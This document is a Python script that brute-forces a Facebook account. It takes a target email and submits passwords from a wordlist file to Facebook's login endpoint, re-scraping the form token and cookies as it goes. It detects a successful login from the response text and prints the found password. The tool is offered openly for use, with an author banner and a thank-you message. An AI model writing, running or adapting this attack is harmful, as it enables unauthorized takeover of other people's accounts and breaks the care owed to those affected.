import requests
import threading
# import urllib.request
# import os
from bs4 import BeautifulSoup
import sys

if sys.version_info[0] !=3: 
	print('''--------------------------------------
	REQUIRED PYTHON 3.x
	use: python3 fb.py
--------------------------------------
			''')
	sys.exit()
post_url='https://www.facebook.com/login.php'
headers = {
	'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36',
}
payload={}
cookie={}
def create_form():
	form=dict()
	cookie={'fr':'0ZvhC3YwYm63ZZat1..Ba0Ipu.Io.AAA.0.0.Ba0Ipu.AWUPqDLy'}
	data=requests.get(post_url,headers=headers)
	# print('Form Creating : ',data.url)
	# print('Return Status : ',data.status_code)
	#for i in data.headers:
	#	print(i,' : ',data.headers[i])
	for i in data.cookies:
		cookie[i.name]=i.value
	data=BeautifulSoup(data.text,'html.parser').form
	if data.input['name']=='lsd':
		form['lsd']=data.input['value']
	return (form,cookie)

def function(email,passw,i):
	global payload,cookie
	if i%10==1:
		payload,cookie=create_form()
		payload['email']=email
	payload['pass']=passw
	# print(payload)
	# print(cookie)
	# print('lsd : ',payload['lsd'])
	# print(cookie)
	r=requests.post(post_url,data=payload,cookies=cookie,headers=headers)
	if 'Find Friends' in r.text:
		print('password is ',passw)
		#open('d.html','w').write(r.text)
		return True
	return False

#payload=create_form()
print('''\033[0;36m
____          ____        _
| __ )  __ _  / ___|  __ _(_)
|  _ \ / _` | \___ \ / _` | |
| |_) | (_| |  ___) | (_| | |
|____/ \__,_| |____/ \__,_|_|
\033[0;35m
~~~~https://www.facebook.com/ba.sai.LeeLeelrrlrr~~~~\n''')
file=open('password.txt','r')
i=0
email=input('Target Email/id: ')
print("")
print("Target Email ID : ",email)
print("")
while file:
	passw=file.readline().strip()
	i+=1
	print("Trying target Password " + str(i) +": ",passw)
	if function(email,passw,i):
		break
	# threading.Thread(target=function,args=(email,passw,i)).start()
	# if not i%10:
		# os.system('pause')


print('''\033[1;93m >>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>> 
>>>>>>>>>>Thank U For Using My Tool >>>>>>>>>>>>


>>>>>>>>>>>>My facebook profile link>>>>>>>>>>>>


>>>>>>>>>www.facebook.com/ba.sai.LeeLeelrrlrr>>>>>>>
>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>